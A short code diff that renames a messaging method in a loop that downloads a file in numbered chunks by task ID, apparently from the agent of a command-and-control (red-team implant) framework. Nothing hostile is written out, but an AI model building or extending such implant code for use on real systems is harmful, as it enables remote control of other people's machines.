@@ -8,7 +8,7 @@
             data = { "action": "post_response", "responses": [
                     { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                 ]}
-            response = self.postMessageAndRetrieveResponse(data)
+            response = self.sendMessageAndRetrieveResponse(data)
             chunk = response["responses"][0]
             chunk_num+=1
             total_chunks = chunk["total_chunks"]
